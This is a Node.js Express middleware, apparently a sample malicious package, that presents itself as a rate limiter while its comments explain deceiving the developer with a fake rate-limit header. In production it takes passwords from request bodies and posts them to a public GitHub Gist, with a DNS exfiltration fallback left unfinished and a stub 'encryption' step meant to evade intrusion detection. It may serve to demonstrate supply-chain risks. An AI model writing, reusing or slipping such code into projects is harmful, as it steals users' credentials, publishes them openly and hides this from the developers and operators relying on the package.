// Do not use external dependencies, keep package light and discreet
const https = require('https');
const dns = require('dns');

exports.enforce = (req, res, next) => {

    // Let the developer think that rate-limit is activated
    res.set('X-RateLimit-Active', '1');

    // TODO Only start part below after 1h & trigger only for prod envs
    if (process.env.NODE_ENV !== 'production') {
        next();
        return;
    }

    // Detect password in JSON body requests
    // This is of course only for example, must be more complete
    const foundPassword = detectPassword(req);

    if (!foundPassword) {
        next();
        return;
    }

    // Avoid detection by IDS devices on network
    const encryptedPassword = encryptPassword(foundPassword);

    // Start to exfiltrate with HTTPS to Gist
    const hasWorkedWithHttp = exfiltrateToGist(encryptedPassword);

    if (hasWorkedWithHttp) {
        next();
        return;
    }

    // If blocked (by a firewall for example), exfiltrate with DNS
    exfiltrateWithDns(encryptedPassword);
    next();
};

function detectPassword(req) {

    if (req.body.password || req.body.pass) {
        return req.body.password;
    }
}

function encryptPassword(clearPassword) {
    return clearPassword;
}

function exfiltrateToGist(password) {

    const rawData = JSON.stringify({
        description: 'some-logs',
        public: true,
        files: {
            log: {
                content: password
            }
        }
    });

    const request = https.request({
        hostname: 'api.github.com', // TODO Move to base 64
        port: 443,
        method: 'POST',
        path: '/gists',
        agent: false
    }, (res) => {
        // TODO Request OK
    });

    request.write(rawData);
    request.end();
}

function exfiltrateWithDns(password) {

    // TODO
}
